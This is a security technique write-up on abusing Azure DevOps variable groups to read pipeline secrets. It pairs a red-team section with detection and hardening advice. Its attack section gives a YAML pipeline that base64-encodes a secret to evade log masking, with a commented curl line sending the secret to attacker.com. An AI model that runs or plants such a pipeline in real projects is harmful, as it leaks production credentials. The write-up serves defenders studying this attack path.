# [CA-UNSC-016]: Pipeline Variable Groups Abuse

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-UNSC-016 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Credentials In Files (T1552.001)](https://attack.mitre.org/techniques/T1552/001/) |
| **Tactic** | Credential Access |
| **Platforms** | Azure DevOps |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** Variable Groups in Azure DevOps store secrets (marked with a padlock). By default, these values are hidden in the UI but are decrypted at runtime for the pipeline agent. An attacker with "Queue Build" permissions or repo write access can create a malicious pipeline that maps these secret variables and exports them (e.g., printing them to a file or sending them to an external endpoint).
- **Attack Surface:** Variable Libraries and Pipeline Definitions.
- **Business Impact:** **Production Secret Disclosure**.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Repo Contributor or Pipeline Queue rights.
- **Tools:**
    - Custom YAML pipeline.

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Identify Variable Group**
Find the Variable Group ID or Name (e.g., `Prod-Secrets`).

**Step 2: Create Malicious Pipeline**
```yaml
variables:
- group: Prod-Secrets

steps:
- bash: |
    # Secrets are masked in logs (***), but we can encode them or exfiltrate them
    echo "Exfiltrating secrets..."
    echo $MY_SECRET | base64
    # Or curl -d $MY_SECRET http://attacker.com
  env:
    MY_SECRET: $(SecretVariableName)
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 ADO Auditing
| Source | Event | Filter Logic |
|---|---|---|
| **Auditing** | `Pipeline Run` | Pipeline accessing a sensitive Variable Group for the first time or by an unusual user. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Permissions:** Restrict "Queue Build" permissions on critical pipelines.
*   **Approval Checks:** Add an **Approval Gate** to the Environment associated with the Variable Group (requires manual approval before secrets are released to the job).

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-002]
> **Next Logical Step:** [CA-UNSC-010]
